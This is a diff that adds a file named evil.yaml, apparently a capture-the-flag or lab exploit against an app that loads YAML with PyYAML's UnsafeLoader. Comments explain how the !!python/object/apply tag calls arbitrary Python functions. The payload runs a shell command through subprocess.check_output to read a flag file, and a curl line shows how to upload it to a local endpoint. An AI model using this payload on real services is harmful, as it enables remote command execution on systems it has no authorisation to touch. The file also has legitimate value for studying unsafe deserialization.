@@ -1,0 +1,20 @@
+# evil.yaml — malicious PyYAML payload
+#
+# yaml.load(data, Loader=yaml.UnsafeLoader) deserializes
+# !!python/object/apply tags, calling arbitrary Python callables.
+#
+# os.system("cmd")          — returns exit code only (output lost)
+# subprocess.check_output() — captures and returns stdout
+#
+# !!python/object/apply supports positional args and kwds:
+#   args: [positional_arg]
+#   kwds: {keyword: value}
+#
+# Upload with:
+#   curl -F "file=@evil.yaml" http://localhost:5000/yaml
+
+!!python/object/apply:subprocess.check_output
+args:
+- type flags\\yaml.txt
+kwds:
+  shell: true
